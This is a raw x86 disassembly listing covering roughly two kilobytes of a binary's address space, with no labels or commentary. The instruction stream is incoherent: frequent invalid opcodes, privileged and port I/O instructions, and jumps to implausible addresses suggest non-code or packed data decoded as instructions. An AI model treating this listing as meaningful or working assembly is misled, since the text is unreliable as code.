  404665:	fmul   st(3),st
  404667:	xor    bl,BYTE PTR [esi]
  404669:	cmc    
  40466a:	jb     0x4046d7
  40466c:	push   cs
  40466d:	adc    al,0xc2
  40466f:	or     bh,BYTE PTR [ecx-0xa1b5d89]
  404675:	xor    esp,ebx
  404677:	push   eax
  404678:	pop    eax
  404679:	sub    BYTE PTR ds:0xd449c705,cl
  40467f:	add    eax,DWORD PTR [ebx+0x4c]
  404682:	retf   0x9d01
  404685:	mov    dl,0xb9
  404687:	jbe    0x40468f
  404689:	cmp    al,0x3e
  40468b:	dec    edi
  40468c:	sub    eax,0xdc78e18d
  404691:	(bad)  
  404692:	fwait
  404693:	pop    ds
  404694:	adc    al,0xb2
  404696:	iret   
  404697:	mov    esp,DWORD PTR [edx]
  404699:	mov    dh,0x45
  40469b:	cwd    
  40469d:	and    al,0xa4
  40469f:	retf   0xe9a6
  4046a2:	mov    ah,0xc1
  4046a4:	fidiv  WORD PTR [ebp-0x63]
  4046a7:	adc    ch,BYTE PTR [esi+eax*4]
  4046aa:	test   eax,0x907a6ef5
  4046af:	dec    edx
  4046b0:	sbb    DWORD PTR [ebx-0x326b225f],ecx
  4046b6:	imul   eax,esi,0xffffffa5
  4046b9:	mov    ah,0xfd
  4046bb:	and    BYTE PTR [ecx],dh
  4046bd:	fidivr DWORD PTR [esi+0x4b4e30c2]
  4046c3:	mov    DWORD PTR [ecx],eax
  4046c5:	loopne 0x4046a6
  4046c7:	mov    edx,0x4e9abd3
  4046cc:	fidivr DWORD PTR [edi-0x4d]
  4046cf:	fisub  DWORD PTR [eax+0x20]
  4046d2:	inc    edi
  4046d3:	div    DWORD PTR [ebx-0x2a]
  4046d6:	ins    BYTE PTR es:[edi],dx
  4046d7:	inc    edi
  4046d8:	lahf   
  4046d9:	ret    
  4046da:	ja     0x404741
  4046dc:	sub    al,0x70
  4046de:	imul   ecx,DWORD PTR [eax-0x2cb90496],0xfffffff8
  4046e5:	jle    0x4046bf
  4046e7:	clc    
  4046e8:	and    ax,0xdaa7
  4046ec:	sub    DWORD PTR [edi+ebx*2-0x64],eax
  4046f0:	pop    edi
  4046f1:	inc    BYTE PTR [ebp+ebx*1-0x4a366815]
  4046f8:	sub    ebx,DWORD PTR [esi]
  4046fa:	retf   
  4046fb:	mov    cl,0x16
  4046fd:	sti    
  4046fe:	adc    esp,DWORD PTR [edx]
  404700:	jecxz  0x404723
  404702:	jecxz  0x40472d
  404704:	sti    
  404705:	mov    ebp,0xf5417428
  40470a:	fsub   DWORD PTR [edi]
  40470c:	and    BYTE PTR ds:0x5d035f9d,bl
  404712:	xchg   esp,eax
  404713:	add    ebp,esp
  404715:	loopne 0x4046c8
  404717:	mov    eax,ds:0xc3d6fabc
  40471c:	jmp    0x7bfaedbc
  404721:	dec    esp
  404722:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404723:	sub    al,0xf7
  404725:	daa    
  404726:	inc    ecx
  404727:	mov    ah,0xf6
  404729:	ret    0xeddc
  40472c:	pop    ds
  40472d:	aaa    
  40472e:	inc    ebx
  40472f:	dec    ebp
  404730:	(bad)  
  404731:	jo     0x4046d9
  404733:	inc    edx
  404734:	data16 repz jg 0x40475d
  404738:	sti    
  404739:	mov    esp,0xcee98a26
  40473e:	scas   eax,DWORD PTR es:[edi]
  40473f:	xor    eax,0x678ee2e7
  404744:	dec    ebp
  404745:	les    ebx,FWORD PTR [esi+ebx*8+0x3a7e190d]
  40474c:	adc    ax,0x8ef8
  404750:	mov    bl,0xb0
  404752:	sub    BYTE PTR [ebx-0x1cffc88e],dl
  404758:	jno    0x404743
  40475a:	xchg   edi,eax
  40475b:	and    bh,dh
  40475d:	dec    ebx
  40475e:	pop    ebp
  40475f:	mov    eax,0xe3649014
  404764:	dec    edi
  404765:	pop    edi
  404766:	clc    
  404767:	arpl   WORD PTR [ebx+0x15753477],dx
  40476d:	lods   al,BYTE PTR ds:[esi]
  40476e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40476f:	inc    edi
  404770:	jecxz  0x40476a
  404772:	in     al,0x58
  404774:	push   es
  404775:	pushf  
  404776:	jmp    DWORD PTR ds:0xf2d0b199
  40477c:	or     DWORD PTR [edx+0xd],0x2b
  404780:	pop    esp
  404781:	lahf   
  404782:	clc    
  404783:	jne    0x4047aa
  404785:	sbb    BYTE PTR [eax],al
  404787:	in     eax,dx
  404788:	push   0x20
  40478a:	sbb    DWORD PTR [ecx+ebx*1],edx
  40478d:	fisttp WORD PTR [edi]
  40478f:	stos   DWORD PTR es:[edi],eax
  404790:	aaa    
  404791:	mov    ecx,edx
  404793:	pop    ecx
  404794:	sar    BYTE PTR [ebx],0x1d
  404797:	call   0xa8f4:0xb0694bd0
  40479e:	push   edx
  40479f:	popa   
  4047a0:	or     BYTE PTR [edx],dh
  4047a2:	xor    eax,0x6c70a962
  4047a7:	or     BYTE PTR [edx-0x7494f989],bh
  4047ad:	fdiv   st(5),st
  4047af:	push   eax
  4047b0:	mov    BYTE PTR [ebp-0x17324d06],dl
  4047b6:	pop    ecx
  4047b7:	in     eax,dx
  4047b8:	mov    cl,0x8b
  4047ba:	fcomp  st(5)
  4047bc:	push   cs
  4047bd:	pop    edx
  4047be:	mov    al,ds:0xc90769d2
  4047c3:	int    0xb9
  4047c5:	xchg   ebx,eax
  4047c6:	(bad)  
  4047c7:	pusha  
  4047c8:	mov    ds:0xfc66781d,eax
  4047cd:	in     eax,dx
  4047ce:	shr    BYTE PTR [ebx+0x4d],1
  4047d1:	jecxz  0x404824
  4047d3:	fwait
  4047d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4047d5:	gs popa 
  4047d7:	dec    ecx
  4047d8:	out    0xb1,al
  4047da:	cs or  eax,0xfa11bcd1
  4047e0:	mov    dh,0xb6
  4047e2:	ffree  st(3)
  4047e4:	push   ss
  4047e5:	xor    edi,esi
  4047e7:	loope  0x4047be
  4047e9:	ins    BYTE PTR es:[edi],dx
  4047ea:	iret   
  4047eb:	and    edi,DWORD PTR [eax-0x6a]
  4047ee:	(bad)  
  4047ef:	mov    cl,0x31
  4047f1:	adc    al,0x5e
  4047f3:	sbb    al,0x7b
  4047f5:	dec    esp
  4047f6:	mov    dl,0xa9
  4047f8:	sbb    eax,0xad4b5ad1
  4047fd:	xchg   ebx,eax
  4047fe:	popf   
  4047ff:	stc    
  404800:	jbe    0x404807
  404802:	dec    esi
  404803:	call   0x8b92:0x7f538609
  40480a:	jmp    0x20c63dc5
  40480f:	stc    
  404810:	xor    cl,BYTE PTR [eax+0x5979f92a]
  404816:	(bad)  
  404818:	lds    edi,FWORD PTR [ebx+0x53f3dd49]
  40481e:	xor    ah,BYTE PTR [eax-0x22]
  404821:	sbb    eax,ecx
  404823:	mov    esp,0x2ae74795
  404828:	cmp    bl,BYTE PTR [esi+0x49f11f6c]
  40482e:	bnd jmp 0x22ab25af
  404834:	push   0x3a91fbc
  404839:	std    
  40483a:	jo     0x404814
  40483c:	mov    dl,0x1
  40483e:	xchg   esp,eax
  40483f:	xor    esi,DWORD PTR [ecx-0x67aa061a]
  404845:	idiv   BYTE PTR [esi-0x191bcef8]
  40484b:	es fwait
  40484d:	ret    
  40484e:	dec    esi
  40484f:	jmp    0x404811
  404851:	and    dl,ah
  404853:	scas   al,BYTE PTR es:[edi]
  404854:	daa    
  404855:	(bad)  
  404856:	cmp    edx,DWORD PTR [edi+edi*2+0x7e]
  40485a:	xchg   bl,al
  40485c:	pop    esp
  40485d:	cmp    al,BYTE PTR [esi-0x2]
  404860:	out    0xfe,al
  404862:	test   DWORD PTR [ecx-0x6],esp
  404865:	xor    dh,BYTE PTR [edx+0x2c]
  404868:	std    
  404869:	cmp    ebx,edi
  40486b:	inc    esp
  40486c:	dec    ebx
  40486d:	std    
  40486e:	adc    DWORD PTR [edi-0x2a],eax
  404871:	fisubr DWORD PTR [ebp+0x70]
  404874:	cmp    esp,DWORD PTR [ebx+ecx*4]
  404877:	rcl    dl,cl
  404879:	shr    BYTE PTR [esi-0x51],1
  40487c:	cs cdq 
  40487e:	inc    eax
  40487f:	jnp    0x404836
  404881:	jne    0x4048f3
  404883:	outs   dx,BYTE PTR ds:[esi]
  404884:	jle    0x404834
  404886:	mov    edx,edi
  404888:	sub    al,0x77
  40488a:	dec    eax
  40488b:	imul   esi,DWORD PTR [edi+0x3e],0x8665e9ce
  404892:	fistp  QWORD PTR [ebp+0x34193c09]
  404898:	leave  
  404899:	out    0xd6,eax
  40489b:	mov    dl,0x17
  40489d:	adc    BYTE PTR [ecx],bh
  40489f:	add    al,0xc7
  4048a1:	add    eax,0xc5159864
  4048a6:	jl     0x4048fc
  4048a8:	fist   WORD PTR [eax]
  4048aa:	push   eax
  4048ab:	and    edi,ebx
  4048ad:	cmp    eax,0xbd47db9d
  4048b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4048b3:	cmp    ebp,ecx
  4048b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4048b6:	icebp  
  4048b7:	mov    bl,0xea
  4048b9:	push   edi
  4048ba:	in     eax,0xa8
  4048bc:	in     eax,dx
  4048bd:	add    DWORD PTR [ebp-0xe],esi
  4048c0:	xchg   esp,eax
  4048c1:	sub    dl,0x22
  4048c4:	cmp    ch,0x44
  4048c7:	add    eax,0x28714e00
  4048cc:	(bad)  
  4048cd:	shl    BYTE PTR [esi],cl
  4048cf:	or     DWORD PTR [esi],esi
  4048d1:	test   eax,0x7f37479d
  4048d6:	das    
  4048d7:	mov    eax,0x77b7c969
  4048dc:	call   FWORD PTR [ebp+0x7d]
  4048df:	fidiv  DWORD PTR [esi+0x7737fa24]
  4048e5:	(bad)  
  4048e6:	addr16 cmp ebx,eax
  4048e9:	xchg   ecx,eax
  4048eb:	std    
  4048ec:	add    al,0x49
  4048ee:	lock mov bl,0x59
  4048f1:	dec    eax
  4048f2:	imul   esi,DWORD PTR [edi-0xf],0x16
  4048f6:	sub    dl,BYTE PTR [esi]
  4048f8:	lds    ebp,FWORD PTR ds:[ecx+0x1a]
  4048fc:	outs   dx,BYTE PTR ds:[esi]
  4048fd:	jb     0x404916
  4048ff:	inc    ebx
  404900:	ins    DWORD PTR es:[edi],dx
  404901:	xor    ah,BYTE PTR [edi+ecx*4]
  404904:	inc    esi
  404905:	dec    esi
  404906:	and    DWORD PTR [eax+0x542e1e75],ecx
  40490c:	add    edx,ebp
  40490e:	outs   dx,DWORD PTR ds:[esi]
  40490f:	add    BYTE PTR [eax-0x5b],dh
  404912:	pop    ss
  404913:	ins    DWORD PTR es:[edi],dx
  404914:	adc    eax,0xd5617021
  404919:	cmp    al,0x9d
  40491b:	inc    ecx
  40491c:	adc    DWORD PTR [ebp-0x1a],edi
  40491f:	arpl   WORD PTR [edx+0x639ca655],di
  404925:	push   esp
  404926:	pop    ebp
  404927:	mov    ch,0xcc
  404929:	daa    
  40492a:	inc    eax
  40492b:	sti    
  40492c:	lods   eax,DWORD PTR ds:[esi]
  40492d:	push   0xffffffb6
  40492f:	jae    0x4049a3
  404931:	dec    esi
  404932:	lahf   
  404933:	es enter 0xb1cd,0x48
  404938:	aaa    
  404939:	mov    dh,0x3b
  40493b:	in     eax,0xc
  40493d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40493e:	or     eax,0xee12a5a4
  404943:	sub    ch,0x13
  404946:	fcomp  st(1)
  404948:	or     WORD PTR [edi+0x2208548f],bp
  40494f:	sbb    dh,dh
  404951:	xchg   DWORD PTR [ecx+eiz*8+0x553f39d2],esi
  404958:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404959:	sub    eax,0xd0b22577
  40495e:	jbe    0x40491e
  404960:	fwait
  404961:	sub    ebx,DWORD PTR [ebx-0x41]
  404964:	or     al,0xbd
  404966:	pusha  
  404967:	add    al,0xa3
  404969:	dec    esi
  40496a:	inc    edi
  40496b:	adc    DWORD PTR [ebx-0x11],ebp
  40496e:	clc    
  40496f:	xadd   BYTE PTR [ecx+0x480b8fa7],ah
  404976:	shl    DWORD PTR [ebp-0x3c4483cc],0xb4
  40497d:	lahf   
  40497e:	lods   al,BYTE PTR ds:[esi]
  40497f:	call   0x86eebca5
  404984:	mov    ds:0x507374ce,eax
  404989:	jnp    0x4049de
  40498b:	repnz test BYTE PTR [esi+0x7e],dh
  40498f:	dec    esi
  404990:	aad    0xb1
  404992:	shl    BYTE PTR [ebx+eax*2],1
  404995:	outs   dx,DWORD PTR ds:[esi]
  404996:	cli    
  404997:	jbe    0x404976
  404999:	mov    bl,BYTE PTR [ebp+0x32]
  40499c:	pop    edx
  40499d:	push   eax
  40499e:	lods   eax,DWORD PTR ds:[esi]
  40499f:	and    DWORD PTR [edi],esi
  4049a1:	adc    al,0xaa
  4049a3:	mov    al,0x3a
  4049a5:	lods   al,BYTE PTR ds:[esi]
  4049a6:	xor    DWORD PTR [edi-0x33],ecx
  4049a9:	loop   0x4049cd
  4049ab:	and    al,0xb9
  4049ad:	div    DWORD PTR [ebp-0x4d]
  4049b0:	dec    esp
  4049b1:	sbb    BYTE PTR [ebx-0x5e],cl
  4049b4:	lock sub BYTE PTR [ebx-0x735e22f4],ch
  4049bb:	adc    DWORD PTR [edi-0x50],eax
  4049be:	sbb    DWORD PTR ds:0xf0aa1bbd,0x0
  4049c5:	add    eax,ebp
  4049c7:	pop    edx
  4049c8:	pop    ebx
  4049c9:	mov    dh,0xf
  4049cb:	lea    esi,[edx-0x4fe2353b]
  4049d1:	es pop ebp
  4049d3:	inc    ecx
  4049d4:	mov    bp,0xde0
  4049d8:	es lahf 
  4049da:	mov    eax,0x2b74782a
  4049df:	ds xchg edx,eax
  4049e1:	lahf   
  4049e2:	jns    0x404a4e
  4049e4:	lock xchg esp,eax
  4049e6:	std    
  4049e7:	adc    BYTE PTR [edx],ch
  4049e9:	sbb    eax,0x3903b2e4
  4049ee:	xor    eax,0x6b3d8085
  4049f3:	and    al,0xe4
  4049f5:	mov    esp,0x659de053
  4049fa:	fcomp  QWORD PTR [ebx+0x6d]
  4049fd:	nop
  4049fe:	dec    ebp
  4049ff:	(bad)  
  404a00:	inc    dh
  404a02:	cmp    ah,BYTE PTR [edx+0x3a]
  404a05:	pop    edx
  404a06:	push   ebp
  404a07:	jae    0x404a52
  404a09:	and    edi,edi
  404a0b:	mov    dh,0x9e
  404a0d:	dec    edx
  404a0e:	aad    0xb
  404a10:	or     ch,BYTE PTR [ebx-0x775d7f68]
  404a16:	nop
  404a17:	cld    
  404a18:	cmp    bl,BYTE PTR [edx+0x21]
  404a1b:	fadd   st(0),st
  404a1d:	sub    BYTE PTR [esp+eiz*8+0x5f],bl
  404a21:	mov    es,WORD PTR [edi-0x20]
  404a24:	nop
  404a25:	xor    esp,DWORD PTR [ebp-0x9df35ff]
  404a2b:	adc    edi,DWORD PTR [edx+0x1a47ab3c]
  404a31:	cdq    
  404a32:	dec    esi
  404a33:	inc    ebp
  404a34:	nop
  404a35:	cmp    DWORD PTR [ecx-0x48c3a882],esp
  404a3b:	sub    BYTE PTR [esi],dl
  404a3d:	jg     0x404a66
  404a3f:	sbb    al,0xec
  404a41:	mov    ebp,0x2865e85
  404a46:	ret    
  404a47:	mov    ebp,0xc107ea3c
  404a4c:	popa   
  404a4d:	cmp    eax,0x53b8ac9f
  404a52:	int3   
  404a53:	adc    eax,0x216f4cc7
  404a58:	jno    0x404a4b
  404a5a:	xchg   BYTE PTR [ebp+0x22f8d531],dl
  404a60:	mov    bh,0x10
  404a62:	cmp    ebp,0xdcb18ec5
  404a68:	rol    DWORD PTR [ebx+ebx*2+0x77],1
  404a6c:	pop    ecx
  404a6d:	inc    edi
  404a6e:	xor    eax,edx
  404a70:	jl     0x404a67
  404a72:	push   ds
  404a73:	and    edi,esi
  404a75:	jbe    0x404a20
  404a77:	inc    esi
  404a78:	lahf   
  404a79:	and    eax,0x2249f094
  404a7e:	cwde   
  404a7f:	aaa    
  404a80:	pop    edx
  404a81:	push   ebx
  404a82:	pop    edx
  404a83:	mov    edi,0x2e59e5ad
  404a88:	fstp   DWORD PTR [ecx+ebx*4+0x1b]
  404a8c:	inc    ebx
  404a8d:	mov    eax,0xb9c695a8
  404a92:	idiv   ah
  404a94:	inc    edi
  404a95:	mov    al,0x8c
  404a97:	inc    DWORD PTR [edx+ebx*2+0x6e]
  404a9b:	cmp    esi,DWORD PTR [eax+0x71]
  404a9e:	mov    eax,ds:0x51d6cab3
  404aa3:	mov    esp,0x90fb79f
  404aa8:	mov    dh,0x73
  404aaa:	shl    edi,cl
  404aac:	pop    edi
  404aad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404aae:	mov    WORD PTR [esi-0x60fec07c],ss
  404ab4:	popa   
  404ab5:	outs   dx,DWORD PTR ds:[esi]
  404ab6:	sub    BYTE PTR [edx],ch
  404ab8:	jmp    0xd0281947
  404abd:	leave  
  404abe:	push   ebx
  404abf:	neg    DWORD PTR [esi+0x692ce5fb]
  404ac5:	mov    ebp,ss
  404ac7:	ficom  DWORD PTR [ecx+0x4076fb05]
  404acd:	jg     0x404a80
  404acf:	add    al,0x83
  404ad1:	push   es
  404ad2:	imul   eax,DWORD PTR [ebp+0x3a],0xc2acfedc
  404ad9:	inc    ebx
  404ada:	cmp    eax,0xe74dabd
  404adf:	pmaddwd mm7,QWORD PTR cs:[esi]
  404ae3:	add    ebx,ebp
  404ae5:	dec    esi
  404ae6:	dec    esp
  404ae7:	shr    BYTE PTR [ebp+esi*8-0x1384799b],cl
  404aee:	push   ebp
  404aef:	xchg   ebp,eax
  404af0:	mov    ah,0x24
  404af2:	inc    edi
  404af3:	sub    al,0x24
  404af5:	or     BYTE PTR [ebx+0x4d],ah
  404af8:	pop    ds
  404af9:	jns    0x404b31
  404afb:	inc    edx
  404afc:	out    0x31,eax
  404afe:	stos   BYTE PTR es:[edi],al
  404aff:	js     0x404b5a
  404b01:	(bad)  
  404b02:	jle    0x404a84
  404b04:	jle    0x404b76
  404b06:	inc    esi
  404b07:	xor    bl,BYTE PTR [edx+0x25]
  404b0a:	and    BYTE PTR [edi-0x28],ah
  404b0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b0e:	mov    WORD PTR [ecx],?
  404b10:	adc    DWORD PTR [eax],0x2df963b4
  404b16:	ja     0x404b65
  404b18:	ret    0xd5f9
  404b1b:	in     eax,0xd5
  404b1d:	ja     0x404b21
  404b1f:	adc    al,0xe8
  404b21:	ds stc 
  404b23:	les    ecx,FWORD PTR [edi-0x2b]
  404b26:	dec    eax
  404b27:	sub    ebp,ecx
  404b29:	xchg   DWORD PTR [esi-0x59152216],edx
  404b2f:	mov    DWORD PTR [esi],edi
  404b31:	icebp  
  404b32:	mov    eax,0x59d4d7b0
  404b37:	xchg   DWORD PTR [ecx],edx
  404b39:	fist   DWORD PTR [esi]
  404b3b:	call   DWORD PTR [eax]
  404b3d:	lahf   
  404b3e:	pop    es
  404b3f:	(bad)  
  404b40:	cli    
  404b41:	add    DWORD PTR cs:[bx+di+0x36],0x21
  404b47:	inc    esp
  404b48:	sbb    BYTE PTR [eax],0xa0
  404b4b:	cmp    al,BYTE PTR [ebp+0x1e]
  404b4e:	sub    ah,BYTE PTR [bx]
  404b51:	dec    eax
  404b52:	inc    ebp
  404b53:	and    DWORD PTR [esi+ebp*1],ecx
  404b56:	pusha  
  404b57:	call   0x6814fee9
  404b5c:	jl     0x404b6e
  404b5e:	push   es
  404b5f:	imul   edi,DWORD PTR [ecx-0x24462fd3],0x41e2a7bd
  404b69:	out    0x9e,eax
  404b6b:	test   bh,bl
  404b6d:	fwait
  404b6e:	mov    ecx,ebx
  404b70:	mov    edx,0x844604bb
  404b75:	ins    DWORD PTR es:[edi],dx
  404b76:	jb     0x404bcd
  404b78:	dec    ecx
  404b79:	ss test al,0x2
  404b7c:	scas   eax,DWORD PTR es:[edi]
  404b7d:	rcr    BYTE PTR [ecx-0x6d],cl
  404b80:	push   eax
  404b81:	lahf   
  404b82:	test   ecx,edx
  404b84:	dec    esi
  404b85:	shl    BYTE PTR [edi+0x28],0xca
  404b89:	das    
  404b8a:	std    
  404b8b:	pusha  
  404b8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404b8d:	popf   
  404b8e:	push   0x9161ee84
  404b93:	xchg   edi,eax
  404b94:	mov    edi,0xdb4a722e
  404b99:	xchg   ebp,eax
  404b9a:	bound  ebx,QWORD PTR [ebp+0x6e64b5db]
  404ba0:	lds    esp,FWORD PTR [ebx]
  404ba2:	je     0x404bcc
  404ba4:	imul   edi,edi,0x1a
  404ba7:	retf   0xfdb3
  404baa:	out    dx,al
  404bab:	xchg   DWORD PTR [ecx-0x68],esi
  404bae:	fidiv  WORD PTR [ebx+eax*8-0x33a4b1b4]
  404bb5:	jl     0x404c26
  404bb7:	mov    eax,0x19023783
  404bbc:	mov    ax,es:0xf7ec322d
  404bc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404bc4:	push   cs
  404bc5:	add    ecx,DWORD PTR [ebx+0x7321512c]
  404bcb:	(bad)
  404bd0:	push   cs
  404bd1:	aad    0x9e
  404bd3:	lock adc DWORD PTR [ecx+0x6d508c18],eax
  404bda:	sub    DWORD PTR [ecx],ebp
  404bdc:	add    ah,0x21
  404bdf:	and    BYTE PTR [ebp+0x2b],dl
  404be2:	sbb    eax,0x5cb88e0d
  404be7:	enter  0x83dd,0x8a
  404beb:	xor    eax,0x26fc0a8c
  404bf0:	popf   
  404bf1:	mov    ds:0xe604b6dc,eax
  404bf6:	jno    0x404c66
  404bf8:	xchg   ebx,eax
  404bf9:	push   es
  404bfa:	cmp    DWORD PTR [edx],esi
  404bfc:	enter  0x324f,0xa9
  404c00:	enter  0xdbe9,0x4d
  404c04:	sub    al,BYTE PTR [esp]
  404c07:	mov    WORD PTR [edx-0x704916ca],ss
  404c0d:	aam    0x8a
  404c0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c10:	imul   ebx,DWORD PTR [eax-0x203d49c4],0x961963c2
  404c1a:	cmovl  ecx,esi
  404c1d:	sub    eax,0x66edbd5a
  404c22:	or     dh,ah
  404c24:	push   ss
  404c25:	pop    ss
  404c26:	push   es
  404c27:	dec    eax
  404c28:	test   al,0xf0
  404c2a:	adc    al,0xd7
  404c2c:	int3   
  404c2d:	push   esi
  404c2e:	jnp    0x404c80
  404c30:	shl    DWORD PTR [eax-0x54],1
  404c33:	clc    
  404c34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c35:	mov    edx,ebp
  404c37:	jb     0x404ca5
  404c39:	inc    edx
  404c3a:	xchg   ebx,eax
  404c3b:	cwde   
  404c3c:	push   ds
  404c3d:	daa    
  404c3e:	mov    dh,0xe9
  404c40:	pop    esp
  404c41:	(bad)  
  404c42:	push   ds
  404c43:	es stc 
  404c45:	ftst   
  404c47:	mov    DWORD PTR [esi],0xd63f715
  404c4d:	sub    al,0xa5
  404c4f:	outs   dx,DWORD PTR ds:[esi]
  404c50:	add    ecx,DWORD PTR [ebx+ebp*1]
  404c53:	jg     0x404c7f
  404c55:	hlt    
  404c56:	inc    ebp
  404c57:	retf   
  404c58:	std    
  404c59:	jns    0x404cd0
  404c5b:	lahf   
  404c5c:	into   
  404c5d:	int3   
  404c5e:	in     eax,0x17
  404c60:	sub    BYTE PTR [ebx-0x1e],dl
  404c63:	mov    al,0x7e
  404c65:	pop    eax
  404c66:	cmp    BYTE PTR ds:0xdea95341,cl
  404c6c:	xor    esi,ebp
  404c6e:	adc    eax,0x5808b40f
  404c73:	sub    eax,0xffffffc8
  404c76:	sub    DWORD PTR [ecx-0x14],edx
  404c79:	aas    
  404c7a:	pop    esi
  404c7b:	push   ebx
  404c7c:	cdq    
  404c7d:	mov    edi,0x4b200ed9
  404c82:	int    0x13
  404c84:	test   BYTE PTR [edx-0x7e],ch
  404c87:	sub    eax,0x1d498f0a
  404c8c:	lock (bad) [edx+0x26]
  404c90:	ret    
  404c91:	mov    eax,ds:0x41fa1b6e
  404c96:	sub    eax,0xbe3216b8
  404c9b:	push   ebp
  404c9c:	les    ecx,FWORD PTR [edx]
  404c9e:	nop
  404c9f:	or     eax,0xb2202416
  404ca4:	loope  0x404c47
  404ca6:	xor    ah,BYTE PTR [ebp-0x71]
  404ca9:	(bad)  
  404caa:	pop    ecx
  404cab:	dec    edi
  404cac:	sbb    DWORD PTR [edi+edi*2],esp
  404caf:	call   0xa13d:0xd4f75501
  404cb6:	pop    ss
  404cb7:	aam    0xb0
  404cb9:	test   al,0x9f
  404cbb:	jge    0x404d00
  404cbd:	and    BYTE PTR [edi+0x7e6cf176],dh
  404cc3:	out    dx,eax
  404cc4:	test   ecx,edi
  404cc6:	imul   edi,DWORD PTR [ecx],0x8eb20309
  404ccc:	jmp    0xe2aa:0xcf53fb71
  404cd3:	cld    
  404cd4:	cmp    al,0xa5
  404cd6:	cmp    edx,eax
  404cd8:	test   BYTE PTR [ecx+0x364ac50b],0xe6
  404cdf:	clc    
  404ce0:	stos   BYTE PTR es:[edi],al
  404ce1:	mov    ah,0x25
  404ce3:	mov    ds:0x8ef9a571,eax
  404ce8:	fst    DWORD PTR [ebx-0x61a9c877]
  404cee:	clc    
  404cef:	inc    ebx
  404cf0:	add    eax,ebx
  404cf2:	(bad)  
  404cf4:	mov    eax,ds:0x3896e681
  404cf9:	aaa    
  404cfa:	cdq    
  404cfb:	mov    bl,ah
  404cfd:	pop    eax
  404cfe:	lahf   
  404cff:	rcl    BYTE PTR [ebp*1+0x3ef0f384],1
  404d06:	pop    ecx
  404d07:	pop    edx
  404d08:	(bad)  
  404d09:	popf   
  404d0a:	shl    DWORD PTR [edi],cl
  404d0c:	add    DWORD PTR [ebx+ebp*2-0x6a46d168],esp
  404d13:	fidiv  DWORD PTR [esi+0x4d]
  404d16:	stos   BYTE PTR es:[edi],al
  404d17:	or     DWORD PTR [edx-0xa],0xc6107c7f
  404d1e:	(bad)  
  404d20:	sbb    bh,ah
  404d22:	scas   eax,DWORD PTR es:[edi]
  404d23:	cmp    ah,BYTE PTR [ebx+0x490cbe30]
  404d29:	repnz push ds
  404d2b:	repnz daa 
  404d2d:	in     eax,0x2e
  404d2f:	rcl    DWORD PTR [ecx+0x18],1
  404d32:	nop
  404d33:	jmp    0x8d7ceaf1
  404d38:	xchg   esi,eax
  404d39:	push   esi
  404d3a:	add    BYTE PTR [edi+0x47],bh
  404d3d:	in     al,0xbe
  404d3f:	add    BYTE PTR [ecx+0x5d],bl
  404d42:	data16 jp 0x404d84
  404d45:	aam    0x46
  404d47:	inc    edi
  404d48:	aas    
  404d49:	cs in  eax,dx
  404d4b:	mov    cl,0xb4
  404d4d:	and    ebp,DWORD PTR [ebx-0x385685db]
  404d53:	jne    0x404d20
  404d55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d56:	test   eax,0xfc2f9ff8
  404d5b:	bound  ebx,QWORD PTR [edi+0x5c18a422]
  404d61:	and    al,0xf1
  404d63:	into   
  404d64:	dec    esp
  404d65:	int3   
  404d66:	les    esp,FWORD PTR [ebx+0x48]
  404d69:	outs   dx,BYTE PTR ds:[esi]
  404d6a:	inc    eax
  404d6b:	les    ebx,FWORD PTR [esi+edx*2]
  404d6e:	fwait
  404d6f:	mov    cl,0xd6
  404d71:	sbb    eax,0x6f2c976a
  404d76:	pop    edx
  404d77:	in     al,0x5a
  404d79:	pop    edi
  404d7a:	dec    ecx
  404d7b:	out    0xaa,eax
  404d7d:	sbb    al,0x98
  404d7f:	cmp    eax,0x1eb98819
  404d84:	push   cs
  404d85:	outs   dx,DWORD PTR ds:[esi]
  404d86:	pop    ebx
  404d87:	or     eax,0x68567544
  404d8c:	daa    
  404d8d:	jnp    0x404d8d
  404d8f:	jecxz  0x404d9a
  404d91:	mov    eax,ds:0x3cbdd2e0
  404d96:	inc    edi
  404d97:	fwait
  404d98:	popf   
  404d99:	leave  
  404d9a:	fwait
  404d9b:	pop    ds
  404d9c:	popf   
  404d9d:	pop    edi
  404d9e:	outs   dx,BYTE PTR ds:[esi]
  404d9f:	adc    esp,DWORD PTR [ebp+0x5a]
  404da2:	lds    ebx,FWORD PTR [ebp+0x1c]
  404da5:	mov    bh,0x54
  404da7:	cs out 0x67,al
  404daa:	add    BYTE PTR [ebx-0x605575c8],al
  404db0:	retf   0x3be5
  404db3:	popa   
  404db4:	imul   esp,DWORD PTR [esi+0x182c9d48],0xefc02727
  404dbe:	aad    0x92
  404dc0:	in     al,0x4
  404dc2:	inc    esi
  404dc3:	xchg   DWORD PTR [edi+0x6fbbf4cb],edi
  404dc9:	aaa    
  404dca:	add    ah,dh
  404dcc:	mov    ds:0x146dc83,eax
  404dd1:	into   
  404dd2:	inc    ebx
  404dd3:	sub    esp,DWORD PTR [esi]
  404dd5:	dec    edx
  404dd6:	pop    esp
  404dd7:	int3   
  404dd8:	out    dx,al
  404dd9:	mov    eax,ds:0x35b43623
  404dde:	fistp  WORD PTR [edx+0x2]
  404de1:	xchg   BYTE PTR [eax+0x75],cl
  404de4:	iret   
  404de5:	ins    BYTE PTR es:[edi],dx
  404de6:	cs pop eax
  404de8:	je     0x404e15
  404dea:	and    BYTE PTR [eax-0x685dd88b],al
  404df0:	cmp    al,0x8e
  404df2:	xchg   esp,eax
  404df3:	jb     0x404dc1
  404df5:	aad    0x45
  404df7:	sbb    eax,0x41574e30
  404dfc:	lods   al,BYTE PTR ds:[esi]
  404dfd:	aam    0x5f
  404dff:	xor    BYTE PTR [ebp+esi*2-0x7e666982],dl
  404e06:	jnp    0x404dda
  404e08:	push   ebp
  404e09:	or     al,BYTE PTR [esi-0x3e9d4342]
